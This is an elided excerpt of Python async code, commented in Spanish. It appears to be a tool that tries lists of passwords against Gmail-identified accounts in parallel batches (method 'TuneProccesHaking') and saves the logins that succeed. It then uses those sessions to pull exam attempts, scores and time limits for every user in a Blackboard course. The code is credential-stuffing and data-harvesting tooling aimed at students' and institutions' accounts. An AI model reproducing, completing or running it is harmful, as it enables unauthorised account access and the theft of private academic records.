...
class Asincrone(object):
        ...
        while True:
            ...
            if(SelectCurse == []):
                ...
                if(CurseAction == 0):
                    ...
                    restawer  =await self.GetExamInSubCurse(ExamInSubCurse[0]["id"], idcurse)
                    ExamAllUsers = await self.getIntentsExamsAllUsers(restawer, ExamInSubCurse[0]["id"], idcurse)
                    ...
                    self.logger.info("IMPRIMIENDO")
                    await self.MenuTerminal.PrintUsersFormated(FinalUsersFormat[:1000])
                    self.logger.info("LOS USUARIOS SON {}".format(len(FinalUsersFormat)))
    ...
    async def TuneProccesHaking(self,Users,time=0):
        ...
        for x in Users:
            ...
            if user[0].status==Status.Iniciado:
        ...
        if(self.TArgs.asyncPasswords):
            ...
            for y,x in enumerate(user[1]):
                ...
                if(len(user)<3):
                    ...
                    username=user[2]
                newusers[y%self.TArgs.asynclimitproccespassword].append(Connect(gmail=user[0],password=x,name=username,logger=self.logger))
            #newusers=[[1,3],[2,4]]
            coro=[self.TuneProccesHaking(x,self.TArgs.asyncTimepassworduser*y) for y,x in enumerate(newusers,1)]
            while coro:
                #solo hay 2 coros procesados por wait
            ...
            for y,pwd in enumerate(user[1]):
                if(len(user)<3):
                    ...
                    username=user[2]
                newusers.append(Connect(gmail= user[0],password= pwd,name=username , logger= self.logger))
    ...
    async def SaveUserOpen(self, users: Connect, CursesUser,userLast,ficher):
        ...
        if(users!=None):
            ...
            stringer += "~{}|{}".format(userLast[0],",".join(userLast[1]))
    ...
    async def GetExamInSubCurse(self, ExamelIDcolum, CurseID):
        ...
        for s, y in list(enumerate(L5.copy()))[::-1]:
            ...
            if(y is None):
                ...
                await self.Session.pop(s).session.close()
    ...
    async def  getIntentsExamsAllUsers(self, L5, ExamelIDcolum, CurseID):
        ...
        L6 = await asyncio.gather(*[x.getAllIntentsExamDell(CurseID, ExamelIDcolum, y["results"][0]["id"]) for y, x in list(zip([z for z in L5 if(z is not None)] , self.Session)) if(y.get("status")!=403)  ])
        return L6
    ...
    async def AnaliticExamAllUsers(self, L6):
        ...
        for p, a in enumerate(L6):
            ...
            for b in a.ExamDell["results"]:
                ...
                puntosobtenidos = b["toolAttemptDetail"]["resource/x-bb-assessment"].get("points")
                puntosposibles = b["toolAttemptDetail"]["resource/x-bb-assessment"].get("possiblePoints")
                estado1 = b["toolAttemptDetail"]["resource/x-bb-assessment"].get("status")
                LimiteTiempo = b["toolAttemptDetail"]["resource/x-bb-assessment"].get("timeLimitSeconds")
                IDuser = b["userId"]
                estado2 = b["status"]
                fecha_inicio = b.get("attemptLastGradedDate")
